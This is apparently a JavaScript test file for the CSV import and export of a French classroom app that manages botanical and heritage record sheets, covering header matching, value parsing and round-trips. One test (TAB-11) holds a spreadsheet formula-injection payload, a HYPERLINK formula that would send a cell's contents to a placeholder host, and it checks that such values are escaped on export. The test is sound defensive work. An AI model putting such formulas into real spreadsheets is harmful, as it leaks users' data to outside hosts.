import { test } from 'node:test';
import assert from 'node:assert/strict';
import { columnsOf, parseCSV, cellValue, mapHeaders, planImport, buildCsv, buildTeacherCsv, templateCsv } from '../src/js/spreadsheet.js';
import { BOTANIQUE } from '../src/js/templates/botanique.js';
import { S } from '../src/js/store.js';
import { normalizeFiche } from '../src/js/model.js';

const B = BOTANIQUE;
const fiche = (raw, template = B) => normalizeFiche(raw, template);
const headersOf = (row, template = B) => mapHeaders(row, columnsOf(template));
const column = (key, template = B) => columnsOf(template, { answers: true }).find((c) => c.key === key);
const none = { entries: {} };

test('CSV français : séparateur ;, guillemets, retours à la ligne', () => {
  const rows = parseCSV('﻿Nom commun;Description\r\nOlivier;"Arbre ; persistant"\r\n"Chêne ""vert""";"ligne 1\nligne 2"\r\n');
  assert.deepEqual(rows, [
    ['Nom commun', 'Description'],
    ['Olivier', 'Arbre ; persistant'],
    ['Chêne "vert"', 'ligne 1\nligne 2']
  ]);
});

test('TAB-11 : ce qu’un tableur exécuterait reste du texte, et revient intact à l’import', () => {
  const trap = '=HYPERLINK("http://exemple.test/?"&A2;"Clique")';
  const values = [trap, '+1+1', '-2+3', '@SOMME(A1)', ' =1+1'];
  const fiches = values.map((common, i) => fiche({ id: 'f' + i, common }));
  const csv = buildCsv(fiches, none, B);
  const read = parseCSV(csv).slice(1);
  values.forEach((value, i) => assert.ok(read[i].includes("'" + value), value));
  const { ops } = planImport(parseCSV(csv), [], B);
  assert.deepEqual(
    ops.map(({ data }) => data.common),
    values
  );
  const teacher = buildTeacherCsv([], { names: trap, template: B });
  assert.ok(parseCSV(teacher)[1][0].startsWith("'="), 'le nom des élèves');
});

test('TAB-11 : une mesure négative et un texte ordinaire ne changent pas', () => {
  const f = fiche({ id: 'x', common: 'Olivier-de-Bohème' });
  const [head, row] = parseCSV(buildCsv([f], { entries: { x: { temperature: '-3,5' } } }, B));
  const keys = headersOf(head);
  assert.equal(row[keys.indexOf('temperature')], '-3,5');
  assert.equal(row[keys.indexOf('common')], 'Olivier-de-Bohème');
  assert.equal(cellValue(column('common'), "L'olivier"), "L'olivier");
});

test('TAB-03 : titres de colonnes reconnus avec souplesse', () => {
  assert.deepEqual(headersOf(['N° photo', 'NOM COMMUN', 'Température (°C)', 'Luminosité', 'Couleur']), ['ref', 'common', 'temperature', 'light', null]);
});

test('TAB-06 : valeurs : dates, oui/non, positions', () => {
  assert.equal(cellValue(column('date'), '12/09/2026'), '2026-09-12');
  assert.equal(cellValue(column('date'), '46277'), '2026-09-12'); // n° de série Excel
  assert.equal(cellValue(column('date'), '2026-9-2'), '2026-09-02');
  assert.equal(cellValue(column('date'), 'au printemps'), 'au printemps');
  assert.equal(cellValue(column('visible'), 'non'), false);
  assert.equal(cellValue(column('visible'), 'oui'), true);
  assert.equal(cellValue(column('refX'), '30,5 %'), 30.5);
  assert.equal(cellValue(column('refX'), '150'), 100);
  assert.equal(cellValue(column('refX'), 'au fond'), null);
});

test('TAB-05 : import : complète par réf. photo, même quand une réf. est en double', () => {
  const existing = [fiche({ ref: '2', common: 'Laurier rose' }), fiche({ ref: '2', common: 'Tamaris', species: 'Tamarix gallica' })];
  const rows = [
    ['Réf. photo', 'Nom commun', 'Nom scientifique'],
    ['2', 'Tamaris', 'Tamarix gallica'],
    ['2', 'Laurier rose', ''],
    ['', 'Olivier', 'Olea europaea'],
    ['', '', '']
  ];
  const plan = planImport(rows, existing, B);
  assert.equal(plan.updated, 2);
  assert.equal(plan.added, 1);
  assert.equal(plan.skipped, 1);
  assert.equal(plan.ops[0].existing, existing[1], 'la sauge va sur la fiche de la sauge');
  assert.equal(plan.ops[1].existing, existing[0], 'le romarin sur celle du romarin');
});

test('TAB-05 : sans réf. photo, une fiche se retrouve par son nom scientifique, sinon par son nom commun', () => {
  const existing = [fiche({ common: 'Olivier', species: 'Olea europaea' }), fiche({ common: 'Chêne vert' })];
  const plan = planImport(
    [
      ['Nom commun', 'Nom scientifique'],
      ['Olivier d’Europe', 'olea EUROPAEA'],
      ['chene vert', '']
    ],
    existing,
    B
  );
  assert.deepEqual(
    plan.ops.map((op) => op.existing),
    existing
  );
});

test('TAB-03 : un fichier sans colonne de nom est refusé, en nommant les colonnes attendues', () => {
  assert.throws(() => planImport([['Famille'], ['Oleaceae']], [], B), /colonne « Nom commun » ou « Nom scientifique » introuvable/);
});

test('TAB-10 : exporter puis réimporter garde toutes les positions réelles, y compris pour une fiche qui n’en a qu’une partie', () => {
  const fiches = [
    fiche({ id: 'a', common: 'Noisetier', refX: 12.3456, refY: 65.4321 }),
    fiche({ id: 'b', common: 'Sureau', refX: 0, refY: 100 }),
    fiche({ id: 'c', common: 'Sans position' })
  ];
  const { ops } = planImport(parseCSV(buildCsv(fiches, none, B)), [], B);
  const positions = Object.fromEntries(ops.map(({ data }) => [data.common, [data.refX, data.refY]]));
  assert.deepEqual(positions['Noisetier'], [12.35, 65.43], 'à deux décimales : un millième de la largeur du plan environ');
  assert.deepEqual(positions['Sureau'], [0, 100], 'zéro est une position');
  assert.deepEqual(positions['Sans position'], [undefined, undefined]);
});

test('export CSV puis relecture : mêmes valeurs', () => {
  const f = fiche({ id: 'x', ref: '5a', common: 'Olivier ; arbre', exposure: '☀️☀️ Soleil', visible: false, refX: 12.345, refY: 50 });
  const csv = buildCsv([f], { entries: { x: { temperature: '21,5' } } }, B);
  const [head, row] = parseCSV(csv);
  const keys = headersOf(head);
  const get = (k) => row[keys.indexOf(k)];
  assert.equal(get('common'), 'Olivier ; arbre');
  assert.equal(get('exposure'), '☀️☀️ Soleil');
  assert.equal(get('visible'), 'non');
  assert.equal(get('refX'), '12,35');
  assert.equal(get('temperature'), '21,5');
});

test('rendu prof : mesures, écart et ligne de moyenne', () => {
  const row = (n, common, entry, ev) => ({ n, fiche: fiche({ ref: String(n), common }), entry, ev });
  const csv = buildTeacherCsv(
    [
      row(1, 'Olivier', { temperature: '20', humidity: '50,5', light: '1000' }, { state: 'ok', label: 'Bien placée', d: 2 }),
      row(2, 'Chêne; vert', { temperature: '22.5', humidity: '', light: 'nuageux' }, { state: 'far', label: 'À revoir', d: 12 }),
      row(3, 'Laurier', {}, { state: 'noref', label: 'Pas de position réelle' })
    ],
    { names: 'Léa et Tom', widthMeters: 50, template: B }
  );
  const lines = csv.replace(/^﻿/, '').trim().split('\r\n');
  assert.equal(lines[0], 'Élèves;N°;Réf. photo;Nom commun;Nom scientifique;Température (°C);Hygrométrie (%);Éclairement (lux);Résultat;Écart (m)');
  assert.equal(lines[1], 'Léa et Tom;1;1;Olivier;;20;50,5;1000;Bien placée;1');
  assert.equal(lines[2], 'Léa et Tom;2;2;"Chêne; vert";;22,5;;nuageux;À revoir;6');
  assert.equal(lines[3], 'Léa et Tom;3;3;Laurier;;;;;Pas de position réelle;');
  assert.equal(lines[4], 'Léa et Tom;;;Moyenne;;21,25;50,5;1000;1 / 2 bien placée(s);3,5');
});

test('EDI-10 : dans l’espace enseignant, le tableur n’a plus de colonnes de mesures', (t) => {
  S.teacherSpace = true;
  t.after(() => (S.teacherSpace = false));
  const header = buildCsv([], none, B).replace(/^﻿/, '').split('\r\n')[0];
  assert.doesNotMatch(header, /Température|Hygrométrie|Éclairement/);
  assert.match(header, /Nom commun/);
  assert.deepEqual(headersOf(['Nom commun', 'Température (°C)', 'Hygrométrie']), ['common', null, null]);
  const plan = planImport(
    [
      ['Nom commun', 'Température'],
      ['Olivier', '21']
    ],
    [],
    B
  );
  assert.deepEqual(plan.ignored, ['Température']);
  assert.deepEqual(plan.ops[0].data, { common: 'Olivier' });
});

test('EDI-10 : le mode hors ligne garde ses colonnes de mesures', () => {
  assert.match(buildCsv([], none, B), /Température/);
  assert.deepEqual(headersOf(['Température (°C)']), ['temperature']);
});

/** Les colonnes du tableur en 1.3.7, écrites en dur : clé, titre exporté, variantes reconnues. */
const COLUMNS_137 = [
  [
    'ref',
    'Réf. photo',
    [
      'ref photo',
      'ref',
      'reference photo',
      'reference',
      'n',
      'no',
      'num',
      'numero',
      'n photo',
      'no photo',
      'numero photo',
      'n de photo',
      'repere',
      'n repere',
      'code',
      'id'
    ]
  ],
  ['common', 'Nom commun', ['nom commun', 'nom', 'nom francais', 'nom vernaculaire', 'common']],
  ['species', 'Nom scientifique', ['nom scientifique', 'espece', 'nom latin', 'species', 'scientific']],
  ['family', 'Famille', ['famille', 'famille botanique', 'family']],
  ['exposure', 'Exposition', ['exposition', 'soleil', 'ensoleillement', 'exposure']],
  ['watering', 'Arrosage', ['arrosage', 'eau', 'besoin en eau', 'watering']],
  ['soil', 'Sol', ['sol', 'terre', 'soil']],
  ['heat', 'Chaleur', ['chaleur', 'climat', 'rusticite', 'heat']],
  ['care', 'Entretien', ['entretien', 'taille', 'care']],
  ['date', "Date d'observation", ['date', 'date d observation', 'date observation']],
  ['temperature', 'Température (°C)', ['temperature', 'temp']],
  ['humidity', 'Hygrométrie (%)', ['hygrometrie', 'humidite', 'humidity']],
  ['light', 'Éclairement (lux)', ['eclairement', 'luminosite', 'lumiere', 'lux', 'light']],
  ['description', 'Description', ['description', 'description de l espece']],
  ['notes', 'Observations', ['observations', 'observations de terrain', 'notes', 'commentaires', 'remarques']],
  ['visible', 'Visible élèves (oui/non)', ['visible eleves', 'visible', 'visible pour les eleves']],
  ['refX', 'Position réelle X (%)', ['position reelle x', 'x reel', 'refx', 'x']],
  ['refY', 'Position réelle Y (%)', ['position reelle y', 'y reel', 'refy', 'y']]
];

test('MOD-02 : avec le modèle botanique, le tableur a les colonnes de la 1.3.7 et reconnaît chacune de leurs variantes', () => {
  const columns = columnsOf(B, { answers: true });
  assert.deepEqual(new Set(columns.map((c) => c.title)), new Set(COLUMNS_137.map(([, title]) => title)), 'les mêmes titres exportés');
  for (const [key, title, aliases] of COLUMNS_137) {
    assert.deepEqual(mapHeaders([title, ...aliases], columns), Array(aliases.length + 1).fill(key), key);
  }
  // Un fichier écrit en 1.3.7, colonnes dans leur ordre d'alors, se relit tel quel
  const old =
    "Réf. photo;Nom commun;Nom scientifique;Famille;Exposition;Arrosage;Sol;Chaleur;Entretien;Date d'observation;Température (°C);Hygrométrie (%);Éclairement (lux);Description;Observations;Visible élèves (oui/non);Position réelle X (%);Position réelle Y (%)\r\n1;Olivier;Olea europaea;Oleaceae;☀️☀️☀️;💧;Sableux;Chaud;Taille;12/09/2026;21;50;1000;Arbre;Près du portail;oui;10;20\r\n";
  const { ops } = planImport(parseCSV(old), [], B);
  assert.deepEqual(ops[0].data, {
    ref: '1',
    common: 'Olivier',
    species: 'Olea europaea',
    family: 'Oleaceae',
    exposure: '☀️☀️☀️',
    watering: '💧',
    soil: 'Sableux',
    heat: 'Chaud',
    care: 'Taille',
    date: '2026-09-12',
    temperature: '21',
    humidity: '50',
    light: '1000',
    description: 'Arbre',
    notes: 'Près du portail',
    visible: true,
    refX: 10,
    refY: 20
  });
});

test('TAB-09 : le modèle de tableur d’un cours a ses colonnes, et une fiche d’exemple faite des exemples du modèle de fiche', () => {
  const [head, row] = parseCSV(templateCsv(B));
  const keys = headersOf(head);
  assert.equal(row[keys.indexOf('ref')], '1');
  assert.equal(row[keys.indexOf('common')], 'Olivier');
  assert.equal(row[keys.indexOf('species')], 'Olea europaea');
  assert.match(row[keys.indexOf('date')], /^\d{4}-\d{2}-\d{2}$/, 'la date du jour');
  assert.equal(row[keys.indexOf('visible')], 'oui');
});

/** Un modèle d'une autre matière, avec un champ de chaque type. */
const PATRIMOINE = {
  fields: [
    { id: 'c-nom', type: 'text', label: 'Monument', audience: 'info', role: 'title', placeholder: 'Église Saint-Paul', aliases: ['batiment'] },
    { id: 'c-siecle', type: 'number', label: 'Siècle', audience: 'info', unit: 'e' },
    { id: 'c-visite', type: 'date', label: 'Visité le', audience: 'info' },
    {
      id: 'c-style',
      type: 'choice',
      label: 'Style',
      audience: 'info',
      choices: [
        { id: 'roman', label: 'Roman' },
        { id: 'gothique', label: 'Gothique' }
      ]
    },
    {
      id: 'c-materiaux',
      type: 'choice',
      label: 'Matériaux',
      audience: 'correction',
      multiple: true,
      choices: [
        { id: 'pierre', label: 'Pierre' },
        { id: 'brique', label: 'Brique' },
        { id: 'bois', label: 'Bois, chêne' }
      ]
    },
    { id: 'c-classe', type: 'yesno', label: 'Classé', audience: 'info' },
    { id: 'c-etat', type: 'scale', label: 'État', audience: 'teacher', max: 4, symbol: '⭐' },
    { id: 'h-q', type: 'heading', label: 'Questions' },
    { id: 'c-age', type: 'text', label: 'Quel âge a-t-il ?', audience: 'question', list: true },
    { id: 'c-ouvert', type: 'yesno', label: 'Est-il ouvert ?', audience: 'question' },
    { id: 'c-hauteur', type: 'number', label: 'Hauteur', audience: 'question', unit: 'm' }
  ]
};
const P = PATRIMOINE;

test('TAB-03 : les colonnes suivent le modèle du cours : son ordre, ses libellés, ses variantes', () => {
  assert.deepEqual(
    columnsOf(P, { answers: true }).map((c) => c.title),
    [
      'Réf. photo',
      'Monument',
      'Siècle (e)',
      'Visité le',
      'Style',
      'Matériaux',
      'Classé',
      'État',
      'Quel âge a-t-il ?',
      'Est-il ouvert ?',
      'Hauteur (m)',
      'Visible élèves (oui/non)',
      'Position réelle X (%)',
      'Position réelle Y (%)'
    ]
  );
  assert.deepEqual(
    columnsOf(P, { answers: false }).map((c) => c.key),
    ['ref', 'c-nom', 'c-siecle', 'c-visite', 'c-style', 'c-materiaux', 'c-classe', 'c-etat', 'visible', 'refX', 'refY'],
    'sans les questions dans l’espace enseignant'
  );
  assert.deepEqual(mapHeaders(['BÂTIMENT', 'monument', 'siecle', 'hauteur (cm)', 'Couleur'], columnsOf(P)), ['c-nom', 'c-nom', 'c-siecle', 'c-hauteur', null]);
});

test('TAB-06 : une cellule se lit selon le type de son champ : choix par libellé, oui / non, échelle en chiffres ou en symboles', () => {
  const cell = (key, raw) => cellValue(column(key, P), raw);
  assert.equal(cell('c-style', 'GOTHIQUE'), 'gothique');
  assert.equal(cell('c-style', 'roman'), 'roman');
  assert.equal(cell('c-style', 'baroque'), '', 'une proposition inconnue ne passe pas');
  assert.deepEqual(cell('c-materiaux', 'Pierre, brique'), ['pierre', 'brique']);
  assert.deepEqual(cell('c-materiaux', 'Bois, chêne'), ['bois'], 'un libellé qui contient une virgule se reconnaît en entier');
  assert.deepEqual(cell('c-materiaux', 'Bois, chêne ; marbre'), [], 'sinon, morceau par morceau');
  assert.deepEqual(cell('c-materiaux', 'pierre;marbre'), ['pierre']);
  assert.deepEqual(
    ['oui', 'Non', 'x', '1', 'faux', 'peut-être'].map((v) => cell('c-classe', v)),
    ['oui', 'non', 'oui', 'oui', 'non', '']
  );
  assert.deepEqual(
    ['3', '⭐⭐', '7', 'bien'].map((v) => cell('c-etat', v)),
    [3, 2, '', '']
  );
  assert.equal(cell('c-siecle', 'XIIe'), 'XIIe', 'un nombre reste du texte libre, comme une mesure');
});

test('TAB-10 : avec un autre modèle, exporter puis réimporter redonne les mêmes valeurs, réponses comprises', () => {
  const f = fiche(
    {
      id: 'x',
      ref: '3',
      'c-nom': 'Cathédrale',
      'c-siecle': '13',
      'c-visite': '2026-10-02',
      'c-style': 'gothique',
      'c-materiaux': ['pierre', 'bois'],
      'c-classe': 'oui',
      'c-etat': 3
    },
    P
  );
  const answers = { 'c-age': '800 ans', 'c-ouvert': 'non', 'c-hauteur': '42' };
  const csv = buildCsv([f], { entries: { x: answers } }, P);
  const [head, row] = parseCSV(csv);
  assert.equal(row[head.indexOf('Matériaux')], 'Pierre, Bois, chêne', 'les libellés, lisibles dans le tableur');
  assert.equal(row[head.indexOf('Style')], 'Gothique');
  const { ops } = planImport(parseCSV(csv), [], P);
  const { data } = ops[0];
  assert.deepEqual(data['c-materiaux'], ['pierre'], 'un libellé à virgule ne survit pas à une liste : c’est la limite de l’export');
  delete data['c-materiaux'];
  assert.deepEqual(data, {
    ref: '3',
    'c-nom': 'Cathédrale',
    'c-siecle': '13',
    'c-visite': '2026-10-02',
    'c-style': 'gothique',
    'c-classe': 'oui',
    'c-etat': 3,
    ...answers,
    visible: true
  });
});

test('TAB-09 : un modèle sans titre se nomme par ses champs, et l’exemple prend la première proposition d’un choix', () => {
  const untitled = { fields: P.fields.filter((field) => !field.role) };
  const [head, row] = parseCSV(templateCsv(untitled));
  assert.equal(row[head.indexOf('Style')], 'Roman');
  assert.equal(row[head.indexOf('Matériaux')], 'Pierre');
  const plan = planImport(
    [
      ['Siècle', 'Style'],
      ['12', ''],
      ['', '']
    ],
    [],
    untitled
  );
  assert.equal(plan.ops.length, 1);
  assert.equal(plan.skipped, 1);
  assert.throws(() => planImport([['Couleur'], ['bleu']], [], untitled), /colonne « Siècle » ou « Visité le » introuvable/);
});

test('rendu prof : les colonnes suivent le modèle, et seule une question chiffrée a sa moyenne', () => {
  const rows = [
    {
      n: 1,
      fiche: fiche({ ref: '1', 'c-nom': 'Cathédrale' }, P),
      entry: { 'c-age': '800 ans', 'c-ouvert': 'oui', 'c-hauteur': '40' },
      ev: { state: 'noref', label: '—' }
    },
    { n: 2, fiche: fiche({ ref: '2', 'c-nom': 'Halle' }, P), entry: { 'c-hauteur': '10' }, ev: { state: 'noref', label: '—' } }
  ];
  const lines = buildTeacherCsv(rows, { names: 'Léa', template: P }).replace(/^﻿/, '').trim().split('\r\n');
  assert.equal(lines[0], 'Élèves;N°;Réf. photo;Monument;Quel âge a-t-il ?;Est-il ouvert ?;Hauteur (m);Résultat;Écart (% du plan)');
  assert.equal(lines[1], 'Léa;1;1;Cathédrale;800 ans;Oui;40;—;');
  assert.equal(lines[3], 'Léa;;;Moyenne;;;25;;');
  const untitled = { fields: P.fields.filter((field) => !field.role) };
  const plain = buildTeacherCsv([{ ...rows[1], fiche: fiche({ ref: '2' }, untitled) }], { names: 'Léa', template: untitled })
    .replace(/^﻿/, '')
    .split('\r\n');
  assert.match(plain[0], /^Élèves;N°;Réf\. photo;Fiche;/);
  assert.match(plain[1], /^Léa;2;2;Fiche sans nom;/);
});
